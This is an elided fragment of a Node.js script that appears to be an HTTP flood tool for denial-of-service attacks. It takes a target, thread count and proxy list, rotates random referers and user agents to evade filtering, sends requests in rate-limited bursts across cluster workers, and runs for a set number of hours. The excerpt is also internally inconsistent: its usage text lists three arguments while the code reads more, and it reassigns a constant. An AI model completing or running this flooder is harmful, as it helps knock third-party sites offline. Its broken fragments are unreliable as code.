...
const manukw = process.argv[5];
const elmanuk = manukw * 3600;
const ratelimit = 50;
...
let currentRefererValue = referers[Math.floor(Math.random() * referers.length)];
...
if (!reqmethod || !target || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    How to use & example:
      node ${process.argv[1]} <GET/POST> <target> <threads>`);
    process.exit(1);
}
...
function buildRequest() {
    ...
    const userAgent = uap[Math.floor(Math.floor(Math.random() * uap.length))];
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        if(customUA) {
                            ...
                            userAgent = uap[Math.floor(Math.floor(Math.random() * uap.length))];
                        }
...
if (cluster.isMaster) {
    ...
    setTimeout(() => process.exit(1), elmanuk * 1000);
